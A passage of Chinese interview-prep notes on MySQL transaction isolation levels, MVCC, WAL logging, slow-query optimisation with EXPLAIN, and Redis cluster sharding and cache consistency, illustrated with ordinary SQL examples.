<p>事务 B 读到了 A 未提交的值，如果 A 回滚，B 就读到了“脏数据”。</p>
</blockquote>
<h2 id="✅-2-Read-Committed（读已提交）🔹Oracle-默认">✅ 2. Read Committed（读已提交）🔹Oracle 默认</h2>
<ul>
<li>❌ 防止了脏读</li>
<li>✅ 但仍会发生：<strong>不可重复读、幻读</strong></li>
</ul>
<h3 id="🔍-示例（不可重复读）：">🔍 示例（不可重复读）：</h3>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- 事务 A： <span class="string">``</span><span class="keyword">SELECT</span> age FROM user <span class="keyword">WHERE</span> id = <span class="number">1</span>; -- 第一次读 age=<span class="number">25</span> <span class="string">``</span> <span class="string">``</span>-- 事务 B： <span class="string">``</span>UPDATE user <span class="built_in">SET</span> age = <span class="number">30</span> <span class="keyword">WHERE</span> id = <span class="number">1</span>; COMMIT; <span class="string">` `</span>-- 事务 A： <span class="string">``</span><span class="keyword">SELECT</span> age FROM user <span class="keyword">WHERE</span> id = <span class="number">1</span>; -- 第二次读 age=<span class="number">30</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>同一事务中，两次读结果不一样 → <strong>不可重复读</strong></p>
</blockquote>
<h2 id="✅-3-Repeatable-Read（可重复读）🔰MySQL-InnoDB-默认">✅ 3. Repeatable Read（可重复读）🔰MySQL InnoDB 默认</h2>
<ul>
<li>❌ 防止了脏读 + 不可重复读</li>
<li>✅ 仍可能发生幻读（但 InnoDB 通过<strong>间隙锁 + MVCC 解决了</strong>）</li>
</ul>
<h3 id="🔍-示例（幻读）：">🔍 示例（幻读）：</h3>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- 事务 A： <span class="string">``</span><span class="keyword">SELECT</span> * FROM <span class="keyword">order</span> <span class="keyword">WHERE</span> price &gt; <span class="number">100</span>; -- 查到了 <span class="number">3</span> 条记录 <span class="string">``</span> <span class="string">``</span>-- 事务 B： <span class="string">``</span>INSERT <span class="keyword">INTO</span> <span class="keyword">order</span> (id, price) VALUES (<span class="number">100</span>, <span class="number">200</span>); COMMIT; <span class="string">` `</span>-- 事务 A： <span class="string">``</span><span class="keyword">SELECT</span> * FROM <span class="keyword">order</span> <span class="keyword">WHERE</span> price &gt; <span class="number">100</span>; -- 查到了 <span class="number">4</span> 条记录（幻读）</span><br></pre></td></tr></table></figure>
<blockquote>
<p>同一范围，两次查结果不一样。但 InnoDB 会加<strong>间隙锁</strong>防止这种插入，实际上也解决了幻读。</p>
</blockquote>
<h2 id="✅-4-Serializable（可串行化）🔒最强">✅ 4. Serializable（可串行化）🔒最强</h2>
<ul>
<li>❌ 完全避免：脏读、不可重复读、幻读</li>
<li>✅ 实现方式：对所有读都加共享锁，对写加排他锁 → 效率低</li>
</ul>
<h3 id="🔍-示例：-2">🔍 示例：</h3>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- 事务 A： <span class="string">``</span><span class="keyword">SELECT</span> * FROM product <span class="keyword">WHERE</span> price &gt; <span class="number">100</span> FOR SHARE; -- 加共享锁 <span class="string">``</span> <span class="string">``</span>-- 事务 B： <span class="string">``</span>INSERT <span class="keyword">INTO</span> product VALUES (<span class="number">101</span>, <span class="number">200</span>); -- 🚫 阻塞，等事务 A 完成</span><br></pre></td></tr></table></figure>
<blockquote>
<p>所有并发都串行化执行，避免所有并发问题，但<strong>吞吐量低</strong>。</p>
</blockquote>
<h2 id="🎯-面试技巧总结（你可以这样答）：">🎯 面试技巧总结（你可以这样答）：</h2>
<blockquote>
<p>数据库提供四种隔离级别来平衡并发性和一致性，越高的隔离级别能防止更多并发问题，但性能越低。</p>
<ul>
<li><code>Read Uncommitted</code> 容忍脏读，不推荐使用；</li>
<li><code>Read Committed</code> 避免脏读，是 Oracle 的默认；</li>
<li><code>Repeatable Read</code> 是 InnoDB 默认，配合 MVCC 和间隙锁解决了不可重复读和幻读；</li>
<li><code>Serializable</code> 最安全，但性能最差，仅用于强一致要求场景。</li>
</ul>
</blockquote>
<h3 id="每种隔离级别的实现方式">每种隔离级别的实现方式</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MDAzN2YzODEwMjlmNmY4MTRjZDRiZjM0ZGNlY2I2NmNfUlMwMUdQQXIycUs1Z2hBVEJuckVnUTBYUFBqNnVFSXJfVG9rZW46TlhPdGI5OUlLb1B6R2N4VDZPMGNtMUxFbmZ4XzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzgyODlkMDI3MjBiNTBkZDA5ZmE4Yzk1MjFlN2VjZGZfaHQ5blpDOFBsNGZWVUt2SHl1ZHlDakZVSGk3ZzNUemRfVG9rZW46V0lvdGJHc1lVb1R3eHR4Z0gzS2NkbzFObmtjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTYwZDZmMjE3YjY3ZDNlNzY3MGJmZWM0MTEzOGI3ZmRfeFBlYTlzVVF1MVl3aVFqZmQ3NXQ5TWkyajU0dTZpbHVfVG9rZW46SmJvZGJubk1Cb21mUDF4YVpCamNOSkxDblliXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjBlNDcxZDc1OGZlMjkzMGEwMTJjZGM4YmRlZTQzYmNfNjB2MkI2dDlyaGZWVE1zVHhVZjhzaUxIM0tzYTZ3d2xfVG9rZW46Qjd6U2IxcFZub0FLZlF4Vmc5b2NURmR1bjlkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-总结面试回答模板（建议背熟）：">✅ 总结面试回答模板（建议背熟）：</h2>
<blockquote>
<p>数据库四种隔离级别的底层主要通过 <strong>MVCC 和锁机制</strong>来实现：</p>
<ul>
<li><strong>Read Uncommitted</strong>：无锁无 MVCC，允许读未提交；</li>
<li><strong>Read Committed</strong>：每次读创建新快照（Read View），避免脏读；</li>
<li><strong>Repeatable Read</strong>：快照固定 + Next-Key Lock 避免幻读，是 InnoDB 默认；</li>
<li><strong>Serializable</strong>：加共享锁/排他锁，彻底串行化，最安全但性能差。</li>
</ul>
</blockquote>
<h3 id="MVCC">MVCC</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YWFkZWQ0NWQ5MjdkMDI0MWIwOGRmNTg4OThlNGZhMDlfYmlQbTUyaldSRVU5QjEzVHFvaGNxdFYzcXFINFMwalBfVG9rZW46WTJVUGJCdGZtb25WYTJ4bmp3SWNTTTJUblhlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🪜-MVCC-的可见性规则">🪜 MVCC 的可见性规则</h2>
<p>当一个事务执行快照读（普通 <code>SELECT</code>）时，会生成一个 <code>Read View</code>，它记录了<strong>当前系统中所有活跃事务的 ID 列表</strong>，然后根据以下规则判断记录是否可见：</p>
<h3 id="🔍-判断逻辑：">🔍 判断逻辑：</h3>
<ul>
<li>若 <code>trx_id &lt; Read View.min_id</code> → 记录版本已提交，可见 ✅</li>
<li>若 <code>trx_id ∈ Read View</code> → 正在执行的事务，未提交，不可见 ❌</li>
<li>若 <code>trx_id &gt; Read View.max_id</code> → 尚未开启的事务，也不可见 ❌</li>
</ul>
<blockquote>
<p>事务自己创建的数据自己始终可见。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YzFkNmU1YTU4ZWNhMGQ4M2QwOTVhZjQyZjFiY2Y0YWVfSmJ3eEh1RHdiVnFKS3FlazBMUENxbXF4NDhvamNhRkFfVG9rZW46QVVsZGJ6b1RWb1lhaW14ejdIbmM3bGJrbkpnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🔍-数据变化分析">🔍 数据变化分析</h2>
<p>在 <code>t3</code> 时，<code>T2</code> 更新了 <code>id=1</code> 这条记录，生成如下版本链：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新记录（最新版本）` `<span class="attribute">id</span>=1, <span class="attribute">name</span>=<span class="string">&#x27;Jerry&#x27;</span>, <span class="attribute">trx_id</span>=T2, roll_pointer -&gt; 上一版本 ``旧记录（undo log 链接版本）` `<span class="attribute">id</span>=1, <span class="attribute">name</span>=<span class="string">&#x27;Tom&#x27;</span>, <span class="attribute">trx_id</span>=T0</span><br></pre></td></tr></table></figure>
<h2 id="👁️-T3-的可见性判断逻辑">👁️ <code>T3</code> 的可见性判断逻辑</h2>
<h3 id="1-T3-要读-id-1，先看到的是版本-name-Jerry-trx-id-T2">1. <code>T3</code> 要读 <code>id=1</code>，先看到的是版本 <code>name='Jerry'</code>, <code>trx_id=T2</code></h3>
<ul>
<li><code>T2 ∈ Read View</code>（T2 正在执行中，未提交）</li>
<li>❌ 不可见，继续往下查版本链</li>
</ul>
<h3 id="2-找到旧版本-name-Tom-trx-id-T0">2.找到旧版本 <code>name='Tom'</code>, <code>trx_id=T0</code></h3>
<ul>
<li><code>T0 &lt; Read View.min_id</code>（旧事务，已提交）</li>
<li>✅ 可见，返回 <code>Tom</code></li>
</ul>
<h2 id="📋-查询结果">📋 查询结果</h2>
<p>最终 <code>T3</code> 查询到的是：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">id</span>=1, <span class="attribute">name</span>=<span class="string">&#x27;Tom&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>虽然此时 T2 实际上已经修改为 Jerry，但因为未提交，T3 根据 MVCC 返回的是老版本快照。</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmRjMjI2Mjg0MDIxZDI0NDE1MjVmZjRmNzc1YmZiNDJfUFE2OVZyVGR4VG95akFZdVBScEJqREhBRHp4bUNkUDhfVG9rZW46SWRkRmJ3STV0b2NRaG14dk15NmNxakFVbjliXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="1、undo-log的WAL机制；2、主从复制的同步机制、半同步机制、异步机制；3、慢sql查询优化思路">1、undo log的WAL机制；2、主从复制的同步机制、半同步机制、异步机制；3、慢sql查询优化思路</h2>
<h2 id="🔁-一、Undo-Log-与-WAL（Write-Ahead-Logging）">🔁 一、Undo Log 与 WAL（Write-Ahead Logging）</h2>
<h3 id="📌-基础知识点">📌 基础知识点</h3>
<p>InnoDB 的事务具备 <strong>原子性 &amp; 持久性</strong>，靠的就是：</p>
<ul>
<li><strong>Undo Log</strong>：记录修改前的数据（用于事务回滚 &amp; MVCC）</li>
<li><strong>Redo Log</strong>：记录修改后数据的物理页位置（用于崩溃恢复）</li>
</ul>
<p>而 WAL（<strong>预写式日志机制</strong>）的核心思想是：</p>
<blockquote>
<p><strong>先写日志，后写磁盘。只要日志写成功，即使宕机也能恢复数据。</strong></p>
</blockquote>
<p>👉 WAL 是指 redo log 先落盘，数据页可以稍后再刷磁盘。</p>
<h3 id="✅-举例说明">✅ 举例说明</h3>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- 事务 T1：将 id=<span class="number">1</span> 的订单金额由 <span class="number">100</span> 改为 <span class="number">200</span> <span class="string">``</span>BEGIN;<span class="string">` `</span>UPDATE orders <span class="built_in">SET</span> amount = <span class="number">200</span> <span class="keyword">WHERE</span> id = <span class="number">1</span>;<span class="string">` `</span>COMMIT;</span><br></pre></td></tr></table></figure>
<p>执行流程：</p>
<ol>
<li>写 <strong>Undo Log</strong>：记录 amount=100</li>
<li>修改缓冲池中的页（amount = 200）</li>
<li>写入 <strong>Redo Log（WAL）</strong>，标记新值 200</li>
<li>commit：<strong>Redo Log fsync 落盘（刷盘）</strong></li>
<li>后台慢慢刷脏页到磁盘（真实数据页更新）</li>
</ol>
<p>即使此时服务器断电，只要 redo log 写了，<strong>重启时可以重放重做日志恢复数据</strong>。</p>
<h3 id="🧠-面试回答模板-2">🧠 面试回答模板</h3>
<blockquote>
<p>InnoDB 使用 WAL 机制保证事务的原子性与持久性。 每次数据修改先记录 Undo 和 Redo Log，Redo Log 提前刷盘，即使未及时更新数据页也能靠 redo 日志恢复。 Undo Log 除了支持回滚，还支持 MVCC 实现一致性读。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MmY1MzdhMTA2Mjc4NWIxOGE0YWJjNmViNTg1NzI5ZmZfM0drdkNMeHlteGtFQ3V5cFhLVml1Q0F6R2Zna2RGS29fVG9rZW46WTRWdGJHbmhPb0VzcW94dkJIVWNnREI4bkRkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🐢-三、慢-SQL-查询优化思路">🐢 三、慢 SQL 查询优化思路</h2>
<h3 id="📌-常见慢-SQL-问题来源：">📌 常见慢 SQL 问题来源：</h3>
<ol>
<li>没有使用索引，导致全表扫描</li>
<li>使用函数或计算阻止索引使用</li>
<li>隐式类型转换</li>
<li>表过大，数据分布不均</li>
<li>使用 <code>OR</code> 或 <code>%like%</code> 等无法走索引</li>
</ol>
<h3 id="✅-举例说明：慢查询案例">✅ 举例说明：慢查询案例</h3>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- 某个搜索接口很慢 <span class="string">``</span><span class="keyword">SELECT</span> * FROM users <span class="keyword">WHERE</span> phone = <span class="string">&#x27;12345678901&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>问题：</p>
<ul>
<li>phone 字段未加索引，扫描 1000 万条记录</li>
</ul>
<p><strong>优化方法：</strong></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> users <span class="keyword">ADD</span> <span class="keyword">INDEX</span> idx_phone(phone);</span><br></pre></td></tr></table></figure>
<p>再执行时，走 <strong>索引快速定位</strong>，性能提升数十倍。</p>
<p>📍进一步优化：只查必要字段，使用覆盖索引：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> phone = <span class="string">&#x27;12345678901&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="🧠-面试回答模板-3">🧠 面试回答模板</h3>
<blockquote>
<p>我通常从四个维度分析慢查询：</p>
<ul>
<li>是否命中索引（explain 分析）</li>
<li>查询字段是否支持覆盖索引</li>
<li>条件是否有函数或计算阻止索引</li>
<li>是否使用了 limit、分页优化等技巧</li>
</ul>
<p>常见优化方式包括加索引、改写 SQL、表结构设计调整和 SQL 分析工具（如 slow log + pt-query-digest）。</p>
</blockquote>
<h2 id="✅-一、慢-SQL-的主要原因是什么？">✅ 一、慢 SQL 的主要原因是什么？</h2>
<h3 id="✅-1-索引缺失-or-索引失效">✅ 1. <strong>索引缺失 or 索引失效</strong></h3>
<p>这是最常见的原因之一。</p>
<ul>
<li><strong>没有建立索引</strong>：全表扫描。</li>
<li><strong>有索引但失效</strong>：如函数、类型转换、like <code>%xxx%</code> 等，优化器无法利用索引。</li>
</ul>
<h3 id="✅-2-索引使用不当">✅ 2. <strong>索引使用不当</strong></h3>
<ul>
<li><strong>走了低选择性索引</strong>：如 <code>sex = '男'</code>，过滤效果差。</li>
<li><strong>冗余索引、多列重复索引</strong>：影响优化器判断，导致 plan 异常。</li>
</ul>
<h3 id="✅-3-数据量太大-无分页">✅ 3. <strong>数据量太大 &amp; 无分页</strong></h3>
<ul>
<li>查询未加 limit，扫描几十万行甚至更多。</li>
<li>排序或 group by 无合适索引，临时表 + 文件排序。</li>
</ul>
<h3 id="✅-4-join-连接不合理">✅ 4. <strong>join 连接不合理</strong></h3>
<ul>
<li>无连接字段索引。</li>
<li>大表 join 大表，且未限制结果集范围。</li>
</ul>
<h3 id="✅-5-SQL-写法或逻辑设计问题">✅ 5. <strong>SQL 写法或逻辑设计问题</strong></h3>
<ul>
<li>业务逻辑混乱，导致查询范围过大。</li>
<li>频繁查询热 Key 或不合理的 where 条件。</li>
</ul>
<h3 id="索引失效的情况和索引访问类型">索引失效的情况和索引访问类型</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=M2Q0Y2Y5ZmE3NjIwNzJiMjA5YTY4NWRhOWU0MmU1OTRfaWxkTjBodVNwZ3huUXVIa29XWHFpZHFtRlR3MXNURWtfVG9rZW46QTY2NmJ6Z2ZxbzBoSWd4emNBVGNQYlB3bjd0XzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YmVhMjE1ZTc3YTkwZTI0ZDViNzlmNDNjN2JjZWY4ZDRfN0pDU2xDRUZVdEVURXBNOGQwdjJiT2EyOVZWWFpHUWVfVG9rZW46QzhadGJCMGNjb2NSczB4MUhUb2NqTjZEbk9lXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🧠-举个例子来理解-ref、range、all-的区别">🧠 举个例子来理解 ref、range、all 的区别</h2>
<p>假设我们有一个表 <code>user</code>：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> TABLE <span class="keyword">user</span> ( <span class="symbol">``</span>  id INT <span class="keyword">PRIMARY</span> <span class="keyword">KEY</span>, <span class="symbol">``</span>  name VARCHAR(<span class="number">50</span>), <span class="symbol">``</span>  age INT, <span class="symbol">``</span>  <span class="keyword">INDEX</span> idx_name(name), <span class="symbol">``</span>  <span class="keyword">INDEX</span> idx_age(age) <span class="symbol">``</span>);</span><br></pre></td></tr></table></figure>
<h3 id="1-ref-类型-——-索引等值匹配">1. <code>ref</code> 类型 —— 索引等值匹配</h3>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXPLAIN</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> <span class="type">name</span> = <span class="string">&#x27;Tom&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>走的是 <code>idx_name</code> 索引。</li>
<li><code>type = ref</code>，表示用普通索引做等值匹配。</li>
<li>可能会有多条结果（不是唯一索引）。</li>
</ul>
<h3 id="2-range-类型-——-范围扫描索引">2. <code>range</code> 类型 —— 范围扫描索引</h3>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXPLAIN</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> age &gt; <span class="number">20</span> <span class="keyword">AND</span> age &lt; <span class="number">30</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>走的是 <code>idx_age</code> 索引。</li>
<li><code>type = range</code>，表示是范围条件。</li>
</ul>
<h3 id="3-all-类型-——-全表扫描（索引没用上）">3. <code>all</code> 类型 —— 全表扫描（索引没用上）</h3>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXPLAIN</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> YEAR(NOW()) = age;</span><br></pre></td></tr></table></figure>
<ul>
<li>虽然 <code>age</code> 有索引，但用了函数 <code>YEAR(NOW()) = age</code>。</li>
<li>索引失效，执行 <code>type = all</code>，全表扫描。</li>
</ul>
<h3 id="EXPLAIN输出的几个核心字段的含义">EXPLAIN输出的几个核心字段的含义</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=M2U4NzZkMGE2NmZiMDc4ZjUxOWExMmU4MzQzNjRjNDBfY1B0TlpCVUdhNEtYNDRSZkJnTUpSY0loZ3AwSE5PT1VfVG9rZW46SERCM2IxWFB6b25xY1R4M1pOaWM4UFZYbjhjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OWQ5ZmQ0N2RkZTk2OWQ3NTk3ZWYwNjk2OGVlMTZmOGZfTHI4dVBmQ2pUSno2Zjk1Zm1OV2t6UldJOWtRR3RrTGlfVG9rZW46S0lHM2JMbllBb1ZnUWt4S1I5N2NwSEE1bm5lXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="📌-三、结合一个完整例子理解">📌 三、结合一个完整例子理解</h2>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXPLAIN</span> <span class="keyword">SELECT</span> <span class="type">name</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> age &gt; <span class="number">30</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> create_time <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>
<p>假设表结构如下：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> TABLE <span class="keyword">user</span> ( <span class="symbol">``</span>  id INT <span class="keyword">PRIMARY</span> <span class="keyword">KEY</span>, <span class="symbol">``</span>  name VARCHAR(<span class="number">50</span>), <span class="symbol">``</span>  age INT, <span class="symbol">``</span>  create_time DATETIME, <span class="symbol">``</span>  <span class="keyword">INDEX</span> idx_age_create (age, create_time) <span class="symbol">``</span>);</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OThmYWRiMjMzNTY5NzRkNWNjZTBjNzZhNmIwZjU1OGJfcTdQTzZvV2lUVnJ5NHdGRnFXT3IyUmZ4eTNHS0hBRjNfVG9rZW46Q2dXc2JrcDFObzFaYlB4YkZZQ2NmZ3hXbnBkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-四、面试中可以这么说：">✅ 四、面试中可以这么说：</h2>
<blockquote>
<p>面试官：“你怎么看 explain 的输出，怎么优化 SQL？”</p>
</blockquote>
<p>你可以答：</p>
<p>「我重点关注 <code>type</code>、<code>key</code>、<code>rows</code>、<code>extra</code> 这几个字段。其中：</p>
<ul>
<li><code>type</code> 反映索引使用效率，我希望是 <code>ref</code> 或 <code>range</code>；</li>
<li><code>key</code> 显示实际使用的索引，不为空才说明用了索引；</li>
<li><code>rows</code> 表示扫描的行数，太多说明可能没有过滤能力；</li>
<li><code>extra</code> 是重点，如果出现 <code>Using filesort</code> 或 <code>Using temporary</code>，我会考虑通过加联合索引优化排序或聚合操作，减少中间开销。」</li>
</ul>
<h2 id="1、redis集群分片为何采用gossip协议同步元数据；2、redis集群分片解决单机实例压力大的问题；3、mysql与redis的数据一致性问题">1、redis集群分片为何采用gossip协议同步元数据；2、redis集群分片解决单机实例压力大的问题；3、mysql与redis的数据一致性问题</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MDk0NmJhZmYwMWY2OGY5NGEzY2EwMTU4OTk1ODFhNDBfRlJkVnVsRlliMFJJRWZzVUhLNTh5cHBpUW9QVTJodEpfVG9rZW46TFRWOGJEZHp5b1I5Q3d4TURxS2Nhb1VIblhjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-二、Redis-集群分片解决单机实例压力大的问题">✅ 二、Redis 集群分片解决单机实例压力大的问题</h2>
<h3 id="🧠-问题背景：">🧠 问题背景：</h3>
<ul>
<li>单个 Redis 实例：<strong>内存容量、并发能力、网络带宽都有瓶颈</strong></li>
<li>Redis 单线程处理请求，<strong>在高并发场景中容易成为瓶颈</strong></li>
</ul>
<h3 id="✅-Redis-分片集群如何解决：">✅ Redis 分片集群如何解决：</h3>
<ol>
<li><strong>数据水平分片（哈希分槽）</strong>：将 key 映射到 16384 个槽位，再分配给不同的节点。
<ol>
<li>比如：<code>hashSlot(key) = CRC16(key) % 16384</code></li>
</ol>
</li>
<li><strong>负载均衡</strong>：每个主节点只处理自己槽位的数据，<strong>分担压力</strong>。</li>
<li><strong>横向扩展</strong>：需要提升性能时，只需<strong>增加节点</strong>，重分配槽位即可。</li>
</ol>
<h3 id="🧪-举个例子：">🧪 举个例子：</h3>
<p>假设有一个社交应用，用户 ID 为 key，用户信息为 value。你部署了一个 3 节点集群：</p>
<ul>
<li>用户 ID 哈希后：
<ul>
<li>ID 为 <code>1001</code> → slot 10500 → 到节点 B</li>
<li>ID 为 <code>2002</code> → slot 3000 → 到节点 A</li>
<li>ID 为 <code>3003</code> → slot 15000 → 到节点 C</li>
</ul>
</li>
</ul>
<p>即便 1 亿用户，分布在不同节点上，<strong>每个节点只处理自己那部分数据</strong>，<strong>读写性能和内存压力都被分摊</strong>了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTQzNDc0NzRmZWZhNmNjNjFlNWEyMjFiOTUzOTNkMDVfYTl5N3FRa05mVElvUjQ1dXUxdFVwMGNPNXMwTm5UVjJfVG9rZW46TzJaR2JIRDROb04yU1h4ZkxUaWNUYTlWblVmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🧠-背景：为什么需要保证一致性？">🧠 背景：为什么需要保证一致性？</h2>
<p>在实际开发中，我们常常将**热点数据（如用户信息、商品库存等）**缓存在 Redis 中，加快读取速度，降低 MySQL 压力。</p>
<p>但问题是：</p>
<blockquote>
<p>Redis 和 MySQL 是两个独立的系统，<strong>没有强一致性机制</strong>。</p>
<p>如果写入 MySQL 成功，但更新或删除 Redis 失败，就会导致<strong>数据不一致</strong>（读到旧数据）。</p>
</blockquote>
<h2 id="🎯-真实业务例子：用户修改昵称">🎯 真实业务例子：用户修改昵称</h2>
<p><strong>场景设定</strong>：</p>
<ul>
<li>用户信息保存在 MySQL 中</li>
<li>Redis 缓存：<code>user:123:name = &quot;Tom&quot;</code></li>
<li>用户 A 请求修改昵称 Tom → Jerry</li>
</ul>
<h3 id="❌-错误流程会出现数据不一致">❌ 错误流程会出现数据不一致</h3>
